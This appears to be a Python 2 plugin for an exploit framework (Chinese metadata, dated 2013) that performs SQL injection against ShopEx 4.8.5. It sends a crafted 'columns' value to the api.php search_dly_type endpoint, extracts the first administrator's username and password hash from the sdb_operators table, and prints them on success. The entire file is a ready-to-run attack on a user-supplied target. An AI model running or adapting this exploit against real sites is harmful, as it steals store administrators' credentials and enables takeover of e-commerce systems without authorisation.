# -*- coding: cp936 -*-
'''
Mst=>exploit=>plugin
'''
class mstplugin:
    '''shopex_4.8.5_sqlInject'''
    infos = [
        ['插件','SHOPEX 4.8.5 SQL注入Exploit'],
        ['作者','mst'],
        ['更新','2013/10/22'],
        ['网址','http://mstoor.duapp.com'],
        ]
    opts  = [
        ['RURL','localhost','目标URL'],
        ['RPATH','/shopex/','CMS路径'],
        ['RPORT','80','目标端口'],
        ['PAYLOAD','false','不需要后攻击插件']
        ]
    def exploit(self):
        if  RPORT == '443':
            url = "https://"+RURL+RPATH
        else:
            url = "http://"+RURL+":"+RPORT+RPATH
        url     = url+"api.php?act=search_dly_type&api_version=1.0"
        poc     = '1,2,(SELECT concat(username,0x7c,userpass) FROM sdb_operators limit 0,1) as name'
        value   = {"columns":poc}
        try:
            color.cprint("[+] Sending exp ..",YELLOW)
            res= fuck.urlpost(url,value)
            ok = fuck.find(r'\w+[|]+\w+',res.read())[0]
            color.cprint("[*] Exploit Successful !",GREEN)
            color.cprint("[*] %s"%ok,GREEN)
        except Exception,e:
            color.cprint("[!] Exploit False ! CODE:%s"%e,RED)
